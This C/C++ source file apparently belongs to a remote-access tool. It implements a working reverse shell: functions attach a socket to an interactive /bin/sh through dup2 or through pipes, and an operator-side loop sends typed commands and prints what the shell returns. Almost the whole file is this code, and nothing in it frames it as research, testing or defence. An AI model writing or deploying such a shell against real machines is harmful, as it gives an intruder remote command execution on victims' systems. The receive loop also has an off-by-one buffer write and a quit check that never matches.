#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <cstring>
#include <cstdlib>
#include "remote_accsess/ReverseShell.h"

#define BUFFER_SIZE 1024

void startRSHSession(int sockFD) {
    pid_t pid = fork();
    if (pid == 0) {
        printf("starting rsh session\n");

        printf("before dup2\n");
        dup2(sockFD, 0);
        dup2(sockFD, 1); // STDOUT
        dup2(sockFD, 2); // STDERR*/

        execl("/bin/sh", "sh", "-i", NULL, NULL);

        perror("execl");
    } else {
        int status;
        printf("father wait\n");

        waitpid(pid, &status, 0);
        printf("rsh session ended %d", status);
    }
}

int isDataAvailable(int fd) {
    fd_set readSet;
    struct timeval timeout;

    FD_ZERO(&readSet);
    FD_SET(fd, &readSet);

    timeout.tv_sec = 0;
    timeout.tv_usec = 0;

    return select(fd + 1, &readSet, NULL, NULL, &timeout) > 0;
}

void startRSHSessionPipe(int sockFD) {

    int toShellPipe[2];
    int fromShellPipe[2];

    if (pipe(toShellPipe) == -1 || pipe(fromShellPipe) == -1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }

    pid_t child_pid = fork();

    if (child_pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (child_pid == 0) {
        close(toShellPipe[1]);
        close(fromShellPipe[0]);

        dup2(toShellPipe[0], STDIN_FILENO);
        dup2(fromShellPipe[1], STDOUT_FILENO);
        dup2(fromShellPipe[1], STDERR_FILENO);

        close(toShellPipe[0]);
        close(fromShellPipe[1]);
        close(sockFD);

        execl("/bin/sh", "sh", "-i", NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else {
        close(toShellPipe[0]);
        close(fromShellPipe[1]);

        char buffer[BUFFER_SIZE];
        ssize_t bytesRead;

        while (waitpid(child_pid, NULL, WNOHANG) == 0) {
            if (isDataAvailable(sockFD)) {
                bytesRead = read(sockFD, buffer, BUFFER_SIZE);
                if (write(toShellPipe[1], buffer, bytesRead) == -1) {
                    perror("write");
                }
            }

            if (isDataAvailable(fromShellPipe[0])) {
                bytesRead = read(fromShellPipe[0], buffer, BUFFER_SIZE);
                if (write(sockFD, buffer, bytesRead) == -1) {
                    perror("write");
                    break;
                }
            }
        }

        close(fromShellPipe[0]);
        close(toShellPipe[1]);
    }
}


void recvRSHSSession(int sockFD) {
    printf("Entering RSH recv mod! (enter '!q' to quit)\n");


    char buffer[1024];
    recv(sockFD, buffer, 1024, 0);
    while (1) {
        ssize_t received_bytes = recv(sockFD, buffer, 1024, 0);
        if (received_bytes <= 0) {
            break;
        }
        buffer[received_bytes] = '\0';
        printf("%s", buffer);

        fgets(buffer, 1024, stdin);
        if (strcmp(buffer, "!q") == 0) break;
        send(sockFD, buffer, strlen(buffer), 0);
    }
};